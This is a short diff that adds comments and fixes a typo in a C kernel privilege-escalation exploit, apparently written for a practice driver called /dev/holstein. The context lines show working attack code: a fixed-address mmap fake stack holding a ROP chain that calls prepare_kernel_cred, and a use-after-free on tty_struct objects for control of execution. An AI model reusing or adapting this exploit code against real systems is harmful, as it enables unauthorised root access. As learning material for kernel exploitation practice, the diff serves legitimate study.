@@ -58,12 +58,15 @@ void fatal(const char *msg) {
 }
 
 void build_fake_stack(void) {
+
+  // the stack memory has to be 8-byte aligned
   fake_stack = mmap((void *)0x39000000 - 0x1000, 0x2000,
                         PROT_READ|PROT_WRITE|PROT_EXEC,
                         MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
   unsigned off = 0x1000;
   unsigned long *chain = (unsigned long*) ((unsigned long) fake_stack + off);
   fake_stack[0] = 0xdead; // put something in the first page so that it gets mapped
+                          // alternatively, mmap using MAP_POPULATE flag
   *chain++ = rop_pop_rdi;
   *chain++ = 0;
   *chain++ = addr_prepare_kernel_cred;
@@ -84,7 +87,7 @@ void build_fake_stack(void) {
 int main() {
   save_state();
 
-  // First use-afer-free. This controlled tty_struct object will be used
+  // First use-after-free. This controlled tty_struct object will be used
   // to store the fake stack and the RIP control address (tty_operations)
   int fd1 = open("/dev/holstein", O_RDWR);
   int fd2 = open("/dev/holstein", O_RDWR);
